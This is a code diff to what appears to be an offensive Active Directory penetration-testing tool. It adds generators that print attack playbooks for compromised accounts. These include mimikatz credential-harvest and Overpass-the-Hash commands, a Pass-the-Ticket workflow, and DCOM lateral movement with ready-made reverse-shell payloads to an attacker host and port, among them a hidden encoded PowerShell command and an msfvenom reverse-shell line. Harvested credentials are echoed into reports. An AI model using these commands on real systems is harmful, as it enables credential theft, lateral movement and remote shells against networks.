@@ -1098,6 +1098,8 @@ def print_post_exploit_commands(
     cred_values: List[str] = None,
     dc_ip: str = None,
     domain_sid: str = None,
+    lhost: str = None,
+    lport: int = None,
     use_colors: bool = True,
 ) -> None:
     """
@@ -1280,6 +1282,18 @@ def print_post_exploit_commands(
             missing_args.insert(0, "<SID>")
         _print_arg_acquisition(missing_args, c)
 
+        # Pass-the-Ticket workflow
+        target_hostnames = [t.computer for t in local_admin_targets[:3]]
+        ptt_console, _ = _generate_ptt_workflow(target_hostnames, domain, c)
+        for line in ptt_console:
+            print(line)
+
+        # DCOM lateral movement workflow
+        target_ips = [t.ip if hasattr(t, 'ip') and t.ip else t.computer for t in local_admin_targets[:3]]
+        dcom_console, _ = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
+        for line in dcom_console:
+            print(line)
+
     # =========================================================================
     # NO PRIVILEGED ACCESS
     # =========================================================================
@@ -1357,6 +1371,294 @@ def _print_arg_acquisition(placeholders: List[str], c) -> None:
         print(f"    {c.DIM}│{c.RESET}")
 
     print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")
+
+
+def _generate_ptt_workflow(targets: List[str], domain: str, c) -> tuple:
+    """
+    Generate Pass-the-Ticket workflow section.
+
+    Args:
+        targets: List of target hostnames the user has access to
+        domain: Domain name (e.g., 'corp.com')
+        c: Colors class
+
+    Returns:
+        Tuple of (console_lines: list, markdown_lines: list)
+    """
+    from .command_mappings import PTT_WORKFLOW
+
+    console_lines = []
+    markdown_lines = []
+
+    # Use first target for examples
+    target = targets[0].split('.')[0] if targets else "TARGET"
+    fqdn = f"{target}.{domain.lower()}" if domain else f"{target}.domain.com"
+
+    # Header
+    console_lines.append("")
+    console_lines.append(f"  {c.CYAN}{c.BOLD}PASS-THE-TICKET WORKFLOW{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'─'*66}{c.RESET}")
+
+    markdown_lines.append("#### Pass-the-Ticket Workflow")
+    markdown_lines.append("")
+
+    # Step 1: Export
+    export = PTT_WORKFLOW["export"]
+    console_lines.append(f"\n  {c.BOLD}{export['title']}{c.RESET}")
+    console_lines.append(f"    {c.GREEN}{export['command']}{c.RESET}")
+    for note in export["notes"]:
+        console_lines.append(f"    {c.DIM}→ {note}{c.RESET}")
+
+    markdown_lines.append(f"**{export['title']}**")
+    markdown_lines.append(f"```")
+    markdown_lines.append(export['command'])
+    markdown_lines.append(f"```")
+    markdown_lines.append("- " + "\n- ".join(export["notes"]))
+    markdown_lines.append("")
+
+    # Step 2: Identify
+    identify = PTT_WORKFLOW["identify"]
+    console_lines.append(f"\n  {c.BOLD}{identify['title']}{c.RESET}")
+    for pattern, desc, priority in identify["priority_order"]:
+        prio_color = c.RED if priority == "HIGHEST" else (c.YELLOW if priority == "HIGH" else c.DIM)
+        console_lines.append(f"    {prio_color}[{priority}]{c.RESET} {pattern} - {desc}")
+
+    markdown_lines.append(f"**{identify['title']}**")
+    markdown_lines.append("| Priority | Pattern | Description |")
+    markdown_lines.append("|----------|---------|-------------|")
+    for pattern, desc, priority in identify["priority_order"]:
+        markdown_lines.append(f"| {priority} | `{pattern}` | {desc} |")
+    markdown_lines.append("")
+
+    # Step 3a: Import Windows
+    imp_win = PTT_WORKFLOW["import_windows"]
+    console_lines.append(f"\n  {c.BOLD}{imp_win['title']}{c.RESET}")
+    for label, cmd in imp_win["commands"]:
+        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")
+
+    markdown_lines.append(f"**{imp_win['title']}**")
+    markdown_lines.append("```")
+    for label, cmd in imp_win["commands"]:
+        markdown_lines.append(f"# {label}")
+        markdown_lines.append(cmd)
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    # Step 3b: Import Linux
+    imp_lin = PTT_WORKFLOW["import_linux"]
+    console_lines.append(f"\n  {c.BOLD}{imp_lin['title']}{c.RESET}")
+    for label, cmd in imp_lin["commands"]:
+        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")
+
+    markdown_lines.append(f"**{imp_lin['title']}**")
+    markdown_lines.append("```bash")
+    for label, cmd in imp_lin["commands"]:
+        markdown_lines.append(f"# {label}")
+        markdown_lines.append(cmd)
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    # Step 4: Use the ticket
+    cap = PTT_WORKFLOW["capitalize"]
+    console_lines.append(f"\n  {c.BOLD}{cap['title']}{c.RESET}")
+    console_lines.append(f"    {c.RED}{c.BOLD}⚠️ {cap['critical_warning']}{c.RESET}")
+    console_lines.append(f"\n    {c.CYAN}Windows:{c.RESET}")
+    for label, cmd in cap["windows_commands"]:
+        filled_cmd = cmd.replace("<TARGET>", target)
+        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")
+    console_lines.append(f"\n    {c.CYAN}Kali:{c.RESET}")
+    for label, cmd in cap["linux_commands"]:
+        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
+        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")
+
+    console_lines.append(f"\n    {c.GREEN}✓ {cap['examples']['correct']}{c.RESET}")
+    console_lines.append(f"    {c.RED}✗ {cap['examples']['wrong']}{c.RESET}")
+
+    markdown_lines.append(f"**{cap['title']}**")
+    markdown_lines.append(f"> ⚠️ **{cap['critical_warning']}**")
+    markdown_lines.append("")
+    markdown_lines.append("**Windows:**")
+    markdown_lines.append("```cmd")
+    for label, cmd in cap["windows_commands"]:
+        filled_cmd = cmd.replace("<TARGET>", target)
+        markdown_lines.append(f"{filled_cmd}")
+    markdown_lines.append("```")
+    markdown_lines.append("")
+    markdown_lines.append("**Kali:**")
+    markdown_lines.append("```bash")
+    for label, cmd in cap["linux_commands"]:
+        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
+        markdown_lines.append(f"{filled_cmd}")
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    # Step 5: Verify access changes
+    console_lines.append(f"\n  {c.BOLD}5. VERIFY ACCESS CHANGES{c.RESET}")
+    console_lines.append(f"    {c.DIM}Compare share access before/after PTT to confirm privilege escalation:{c.RESET}")
+    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares{c.RESET}")
+    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -k --shares{c.RESET}  {c.DIM}# With Kerberos ticket{c.RESET}")
+
+    markdown_lines.append("**5. VERIFY ACCESS CHANGES**")
+    markdown_lines.append("")
+    markdown_lines.append("Compare share access before/after PTT to confirm privilege escalation:")
+    markdown_lines.append("```bash")
+    markdown_lines.append(f"# Before PTT (with password)")
+    markdown_lines.append(f"crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares")
+    markdown_lines.append(f"")
+    markdown_lines.append(f"# After PTT (with Kerberos ticket)")
+    markdown_lines.append(f"crackmapexec smb {fqdn} -k --shares")
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    # Step 6: Troubleshooting
+    trouble = PTT_WORKFLOW["troubleshoot"]
+    console_lines.append(f"\n  {c.BOLD}6. TROUBLESHOOTING{c.RESET}")
+    for issue in trouble["issues"]:
+        console_lines.append(f"    {c.YELLOW}• {issue['problem']}{c.RESET}")
+        console_lines.append(f"      {c.DIM}Fix: {issue['fix']}{c.RESET}")
+
+    markdown_lines.append("**6. TROUBLESHOOTING**")
+    markdown_lines.append("")
+    for issue in trouble["issues"]:
+        markdown_lines.append(f"- **{issue['problem']}**")
+        markdown_lines.append(f"  - Fix: {issue['fix']}")
+    markdown_lines.append("")
+
+    return console_lines, markdown_lines
+
+
+def _generate_dcom_workflow(targets: List[str], c, lhost: str = None, lport: int = None) -> tuple:
+    """
+    Generate DCOM lateral movement workflow section with auto-generated payloads.
+
+    Args:
+        targets: List of target hostnames/IPs the user has access to
+        c: Colors class
+        lhost: Attacker IP for reverse shell (None = show placeholders)
+        lport: Attacker port for reverse shell (None = show placeholders)
+
+    Returns:
+        Tuple of (console_lines: list, markdown_lines: list)
+    """
+    from .payload_generator import PayloadGenerator
+
+    console_lines = []
+    markdown_lines = []
+
+    # Use first target for examples
+    target = targets[0] if targets else "<TARGET>"
+
+    # Create payload generator
+    gen = PayloadGenerator(lhost=lhost, lport=lport)
+
+    # Header with target
+    header_suffix = f" -> {target}" if target != "<TARGET>" else ""
+    console_lines.append("")
+    console_lines.append(f"  {c.CYAN}{c.BOLD}DCOM LATERAL MOVEMENT (Fileless){header_suffix}{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'─'*66}{c.RESET}")
+
+    markdown_lines.append(f"#### DCOM Lateral Movement (Fileless){header_suffix}")
+    markdown_lines.append("")
+
+    if gen.is_configured:
+        # === CONFIGURED: Show ready-to-use payloads ===
+
+        # Step 0: Start listener
+        console_lines.append(f"\n  {c.BOLD}0. START LISTENER{c.RESET}")
+        console_lines.append(f"    {c.GREEN}{gen.get_listener_command()}{c.RESET}")
+
+        markdown_lines.append("**0. START LISTENER**")
+        markdown_lines.append("```bash")
+        markdown_lines.append(gen.get_listener_command())
+        markdown_lines.append("```")
+        markdown_lines.append("")
+
+        # Step 1: Instantiate DCOM object
+        instantiate_cmd = gen.get_dcom_instantiate(target)
+        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT (run from compromised Windows){c.RESET}")
+        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")
+
+        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT** (run from compromised Windows)")
+        markdown_lines.append("```powershell")
+        markdown_lines.append(instantiate_cmd)
+        markdown_lines.append("```")
+        markdown_lines.append("")
+
+        # Step 2: Execute (choose payload)
+        console_lines.append(f"\n  {c.BOLD}2. EXECUTE SHELL (choose one){c.RESET}")
+        markdown_lines.append("**2. EXECUTE SHELL** (choose one)")
+        markdown_lines.append("")
+
+        payloads = gen.get_all_payloads(target)
+        labels = ["A", "B", "C", "D"]
+        for i, payload in enumerate(payloads):
+            label = labels[i] if i < len(labels) else str(i + 1)
+            console_lines.append(f"\n    {c.CYAN}[{label}] {payload.name}{c.RESET} {c.DIM}({payload.description}){c.RESET}")
+            console_lines.append(f"    {c.GREEN}{payload.dcom_command}{c.RESET}")
+            # Show full unencoded payload for reference
+            console_lines.append(f"    {c.DIM}# Unencoded:{c.RESET}")
+            console_lines.append(f"    {c.DIM}{payload.payload_raw}{c.RESET}")
+
+            markdown_lines.append(f"**[{label}] {payload.name}** ({payload.description})")
+            markdown_lines.append("```powershell")
+            markdown_lines.append(payload.dcom_command)
+            markdown_lines.append("```")
+            markdown_lines.append(f"<details><summary>Unencoded payload</summary>")
+            markdown_lines.append("")
+            markdown_lines.append("```powershell")
+            markdown_lines.append(payload.payload_raw)
+            markdown_lines.append("```")
+            markdown_lines.append("</details>")
+            markdown_lines.append("")
+
+        # Troubleshooting
+        console_lines.append(f"\n  {c.BOLD}TROUBLESHOOTING{c.RESET}")
+        console_lines.append(f"    {c.YELLOW}• Access denied / RPC unavailable{c.RESET}")
+        console_lines.append(f"      {c.DIM}Verify local admin, check port 135{c.RESET}")
+        console_lines.append(f"    {c.YELLOW}• Command runs but no shell{c.RESET}")
+        console_lines.append(f"      {c.DIM}Check firewall, verify listener running{c.RESET}")
+
+        markdown_lines.append("**TROUBLESHOOTING**")
+        markdown_lines.append("- Access denied / RPC unavailable: Verify local admin, check port 135")
+        markdown_lines.append("- Command runs but no shell: Check firewall, verify listener running")
+
+    else:
+        # === NOT CONFIGURED: Show placeholders with instructions ===
+
+        console_lines.append(f"\n  {c.YELLOW}TIP: Run with --lhost YOUR_IP --lport 443 for ready-to-use payloads{c.RESET}")
+
+        markdown_lines.append("> **TIP:** Run with `--lhost YOUR_IP --lport 443` for ready-to-use payloads")
+        markdown_lines.append("")
+
+        # Step 1: Instantiate
+        instantiate_cmd = gen.get_dcom_instantiate(target)
+        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT{c.RESET}")
+        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")
+
+        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT**")
+        markdown_lines.append("```powershell")
+        markdown_lines.append(instantiate_cmd)
+        markdown_lines.append("```")
+        markdown_lines.append("")
+
+        # Step 2: Execute (manual)
+        console_lines.append(f"\n  {c.BOLD}2. EXECUTE COMMAND{c.RESET}")
+        console_lines.append(f"    {c.GREEN}$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7'){c.RESET}")
+        console_lines.append(f"\n    {c.DIM}# Generate payload manually:{c.RESET}")
+        console_lines.append(f"    {c.DIM}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1{c.RESET}")
+
+        markdown_lines.append("**2. EXECUTE COMMAND**")
+        markdown_lines.append("```powershell")
+        markdown_lines.append("$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7')")
+        markdown_lines.append("```")
+        markdown_lines.append("")
+        markdown_lines.append("*Generate payload manually:*")
+        markdown_lines.append("```bash")
+        markdown_lines.append("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1")
+        markdown_lines.append("```")
+
+    markdown_lines.append("")
+    return console_lines, markdown_lines
 
 
 # =============================================================================
@@ -1856,6 +2158,176 @@ def _check_domain_access(driver, user_name: str) -> str:
 
     except Exception:
         return None
+
+
+# =============================================================================
+# POST-EXPLOITATION COMMANDS (for run_all_queries report)
+# =============================================================================
+
+def generate_post_exploit_section(driver, use_colors: bool = True, lhost: str = None, lport: int = None) -> tuple:
+    """
+    Generate Post-Exploitation Commands section for the report.
+
+    Shows mimikatz credential harvest commands for all pwned users
+    with local admin access.
+
+    Args:
+        driver: Neo4j driver instance
+        use_colors: Enable ANSI colors for console output
+        lhost: Attacker IP for reverse shells (auto-fetched from config if None)
+        lport: Attacker port for reverse shells (auto-fetched from config if None)
+
+    Returns:
+        Tuple of (console_output: str, markdown_output: str)
+        Returns ("", "") if no pwned users with admin access
+    """
+    from .command_mappings import (
+        get_post_exploit_commands,
+        get_harvest_tips,
+    )
+
+    c = Colors if use_colors else _NoColors
+
+    # Fetch lhost/lport from domain config if not provided
+    if lhost is None or lport is None:
+        try:
+            with driver.session() as session:
+                result = session.run("""
+                    MATCH (d:Domain)
+                    RETURN d.bloodtrail_lhost AS lhost, d.bloodtrail_lport AS lport
+                    LIMIT 1
+                """)
+                record = result.single()
+                if record:
+                    lhost = lhost or record.get("lhost")
+                    lport = lport or record.get("lport")
+        except Exception:
+            pass
+
+    # Fetch all pwned users with credentials
+    pwned_users = _fetch_pwned_users(driver)
+    if not pwned_users:
+        return "", ""
+
+    # Filter to users with local admin access
+    users_with_admin = []
+    for user in pwned_users:
+        user_name = user["name"]
+        access_by_priv = _fetch_user_access(driver, user_name)
+        admin_machines = access_by_priv.get("local-admin", [])
+        domain_access = _check_domain_access(driver, user_name)
+
+        if admin_machines or domain_access:
+            users_with_admin.append({
+                "name": user_name,
+                "cred_type": user.get("cred_type", "password"),
+                "cred_value": user.get("cred_value", ""),
+                "admin_machines": admin_machines,
+                "domain_access": domain_access,
+            })
+
+    if not users_with_admin:
+        return "", ""
+
+    console_lines = []
+    markdown_lines = []
+
+    # Header
+    console_lines.append("")
+    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
+    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.RED}🔓{c.RESET} {c.BOLD}Post-Exploitation Commands{c.RESET}                                    {c.CYAN}{c.BOLD}║{c.RESET}")
+    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
+    console_lines.append("")
+
+    markdown_lines.append("## 🔓 Post-Exploitation Commands")
+    markdown_lines.append("")
+
+    for user_data in users_with_admin:
+        user_name = user_data["name"]
+        cred_type = user_data["cred_type"]
+        cred_value = user_data["cred_value"]
+        admin_machines = user_data["admin_machines"]
+        domain_access = user_data["domain_access"]
+
+        # Extract username and domain from UPN
+        if "@" in user_name:
+            username, domain = user_name.split("@")
+        else:
+            username = user_name
+            domain = ""
+
+        # User header
+        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
+        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
+        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET} = {c.GREEN}{cred_value}{c.RESET}" if cred_value else f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}")
+        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")
+        console_lines.append("")
+
+        markdown_lines.append(f"### {user_name}")
+        markdown_lines.append(f"**Credential:** {cred_type}" + (f" = `{cred_value}`" if cred_value else ""))
+        markdown_lines.append("")
+
+        # Local Admin targets
+        if admin_machines:
+            target_list = ", ".join([m.get("computer", "?").split(".")[0] for m in admin_machines[:5]])
+            if len(admin_machines) > 5:
+                target_list += f" (+{len(admin_machines)-5} more)"
+            console_lines.append(f"  {c.BOLD}Targets ({len(admin_machines)}):{c.RESET} {target_list}")
+            console_lines.append("")
+
+            markdown_lines.append(f"**Targets ({len(admin_machines)}):** {target_list}")
+            markdown_lines.append("")
+
+        # Credential Harvest Order
+        console_lines.append(f"  {c.CYAN}{c.BOLD}CREDENTIAL HARVEST ORDER:{c.RESET}")
+        console_lines.append("")
+
+        markdown_lines.append("#### Credential Harvest Order")
+        markdown_lines.append("")
+        markdown_lines.append("| # | Command | Priority |")
+        markdown_lines.append("|---|---------|----------|")
+
+        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")
+        for idx, cmd_tuple in enumerate(harvest_commands, 1):
+            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
+            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"
+            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'
+
+            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
+            console_lines.append(f"    {idx}. {c.GREEN}{mimi_cmd}{c.RESET}  {priority_color}[{priority.upper()}]{c.RESET}")
+
+            markdown_lines.append(f"| {idx} | `{mimi_cmd}` | {priority.upper()} |")
+
+        console_lines.append("")
+        markdown_lines.append("")
+
+        # Overpass-the-Hash tip
+        console_lines.append(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
+        console_lines.append(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
+        console_lines.append(f"    {c.YELLOW}⚠ Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
+        console_lines.append("")
+
+        markdown_lines.append("#### With Harvested NTLM Hash")
+        markdown_lines.append("")
+        markdown_lines.append(f'```')
+        markdown_lines.append(f'mimikatz.exe "sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe"')
+        markdown_lines.append(f'```')
+        markdown_lines.append(f'> ⚠️ **Important:** Use HOSTNAME not IP after Overpass-the-Hash!')
+        markdown_lines.append("")
+
+        # Pass-the-Ticket workflow
+        target_hostnames = [m.get("computer", "TARGET") for m in admin_machines[:3]]
+        ptt_console, ptt_markdown = _generate_ptt_workflow(target_hostnames, domain, c)
+        console_lines.extend(ptt_console)
+        markdown_lines.extend(ptt_markdown)
+
+        # DCOM lateral movement workflow
+        target_ips = [m.get("ip", m.get("computer", "TARGET")) for m in admin_machines[:3]]
+        dcom_console, dcom_markdown = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
+        console_lines.extend(dcom_console)
+        markdown_lines.extend(dcom_markdown)
+
+    return "\n".join(console_lines), "\n".join(markdown_lines)
 
 
 # =============================================================================
